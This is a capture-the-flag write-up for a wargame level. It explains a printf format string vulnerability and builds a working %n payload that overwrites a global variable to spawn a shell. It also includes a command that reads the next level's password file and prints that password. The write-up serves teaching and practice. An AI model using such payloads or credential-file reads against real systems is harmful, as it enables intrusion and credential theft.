# Level 3 - Format String Exploitation

## Code Analysis

### Function Flow

The `main` function invokes the `v` function, which performs the following operations:

1. Creates a buffer
2. Uses `fgets` to read user input (protected against buffer overflows)
3. Prints the input using `printf`
4. Checks if a global variable `m` equals `0x40` (64 in decimal)
5. If the condition is met, spawns a shell

### The Challenge

The `fgets` function is secure and prevents traditional buffer overflow attacks. However, our goal is to satisfy the conditional check: making the variable `m` equal to 64.

## Vulnerability: Format String Exploitation

### Understanding the Printf Vulnerability

The `printf` call is vulnerable because it lacks a format specifier. This allows us to inject format string directives that can:
- Read from the stack
- Write to arbitrary memory addresses

### Identifying the Target Variable

Using GDB, we examine the comparison operation and discover:

**Address of global variable `m`:** `0x804988c`

This is the memory location we need to modify to contain the value 64.

## Exploitation Process

### Step 1: Locating Our Input on the Stack

We use the `%x` format specifier to dump stack addresses and locate our controlled input:
```bash
python -c 'print "BBBB %x %x %x %x"' > /tmp/exploit3
cat /tmp/exploit3 | ./level3
```

**Output:**
```
BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520 25207825 78252078 20782520
```

The value `42424242` (hexadecimal for "BBBB") appears at the **4th position** on the stack.

### Step 2: Placing the Target Address

We replace "BBBB" with the address of variable `m` in little-endian format:
```bash
python -c 'print "\x8c\x98\x04\x08 %x %x %x %x"' > /tmp/exploit3
```

### Step 3: Writing to the Target Address

#### Understanding the %n Format Specifier

The `%n` specifier writes the **number of bytes printed so far** to the address pointed to by the corresponding argument.

#### Calculating the Required Bytes

- Target value: 64 bytes
- Address already contributes: 4 bytes
- Additional bytes needed: 60 bytes

#### Position Specifier Syntax

We use `%4$n` to specify that we're writing to the argument at the 4th position on the stack.

### Step 4: Final Payload Construction
```bash
python -c 'print "\x8c\x98\x04\x08" + "B" * 60 + "%4$n"' > /tmp/exploit3
```

**Payload breakdown:**
- `\x8c\x98\x04\x08`: Address of `m` (4 bytes)
- `"B" * 60`: Padding to reach 64 bytes total
- `%4$n`: Write byte count (64) to address at 4th stack position

## Executing the Exploit
```bash
cat /tmp/exploit3 - | ./level3
```

## Retrieving the Password

With shell access obtained:
```bash
cat /home/user/level4/.pass
```

## Credentials

**Username:** level4  
**Password:** `b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`

## Summary

This level demonstrates format string exploitation, a powerful technique that allows:
- Reading arbitrary memory locations
- Writing values to specific addresses
- Bypassing secure input functions through vulnerable output functions

Key concepts covered:
- Format string vulnerabilities in `printf`
- Using `%x` to explore stack layout
- Leveraging `%n` to write arbitrary values
- Positional parameter syntax (`%4$n`)
- Precise byte count manipulation for targeted memory writes